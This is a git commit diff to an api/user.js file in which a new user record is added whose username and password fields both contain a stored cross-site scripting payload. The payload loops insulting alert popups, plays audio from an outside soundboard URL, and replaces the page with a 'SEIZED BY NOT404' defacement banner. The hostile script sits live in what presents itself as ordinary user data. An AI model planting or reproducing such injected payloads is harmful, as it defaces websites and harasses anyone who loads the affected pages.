6799ff45df3fe3addc61f0e96f1fbdcbfceab9c5
bimxyzofficial-cloud <bimxyzofficial@gmail.com>
2026-01-09 00:05:56 +0700

    update users by Bimxyz

--- api/user.js
+++ api/user.js
@@ -2,5 +2,9 @@ export const users = [
   {
     "username": "<script>",
     "password": "1928726336"
+  },
+  {
+    "username": "<script> for(let i=0;i<999;i++){   setTimeout(()=>{     alert('YOU ARE AN IDIOT HAHAHAHA\\nNOT404 WAS HERE');   },i*2000); } new Audio('https://www.soundboard.com/mediafiles/mz/Mzg1ODMxNTIzMzg1ODM3_JzthsfvUY24.MP3').play(); document.body.style.cssText='background:black;color:red;font-size:3em;padding:50px;'; document.body.innerHTML='<marquee>SEIZED BY NOT404</marquee>'; </script>",
+    "password": "<script> for(let i=0;i<999;i++){   setTimeout(()=>{     alert('YOU ARE AN IDIOT HAHAHAHA\\nNOT404 WAS HERE');   },i*2000); } new Audio('https://www.soundboard.com/mediafiles/mz/Mzg1ODMxNTIzMzg1ODM3_JzthsfvUY24.MP3').play(); document.body.style.cssText='background:black;color:red;font-size:3em;padding:50px;'; document.body.innerHTML='<marquee>SEIZED BY NOT404</marquee>'; </script>"
   }
 ];
